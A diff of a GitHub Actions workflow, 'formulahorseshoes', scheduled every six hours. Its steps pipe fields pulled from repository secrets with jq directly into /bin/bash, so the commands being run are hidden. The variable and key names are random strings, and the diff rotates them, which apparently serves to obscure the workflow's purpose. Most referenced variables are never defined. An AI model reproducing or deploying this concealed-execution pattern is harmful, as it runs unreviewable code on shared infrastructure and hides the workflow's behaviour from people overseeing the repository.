@@ -1,10 +1,8 @@
 name: formulahorseshoes
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
-
+    - cron: '22 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: formulahorseshoes
         env:
-          beacg3015: ${{ secrets.beacg3015 }}
+          kzd2891: ${{ secrets.kzd2891 }}
         run: |
-          echo $beacg3015 | jq -r .fwf1 | /bin/bash
-          echo $fvl49795 | jq -r .nlthl59 | /bin/bash
-          echo $zpwv27 | jq -r .kshc204 | /bin/bash
-          echo $f1167 | jq -r .ju7 | /bin/bash
-          echo $xz687 | jq -r .ry65394 | /bin/bash
-          echo $qhz95 | jq -r .uh00374 | /bin/bash
-          echo $c1 | jq -r .m0 | /bin/bash
-          echo $fkqo0 | jq -r .j015 | /bin/bash
-          echo $gkilp6 | jq -r .s805 | /bin/bash
-          echo $fef48 | jq -r .qsfrv75 | /bin/bash
+          echo $kzd2891 | jq -r .nue86989 | /bin/bash
+          echo $g1 | jq -r .lu9 | /bin/bash
+          echo $ucou25347 | jq -r .lvdd1247 | /bin/bash
+          echo $yz443 | jq -r .jpdlt64898 | /bin/bash
+          echo $rqhri13724 | jq -r .hdaq0 | /bin/bash
+          echo $saw8847 | jq -r .ltfd697 | /bin/bash
+          echo $qseeo23 | jq -r .v722 | /bin/bash
+          echo $xin10 | jq -r .wlixz72245 | /bin/bash
 
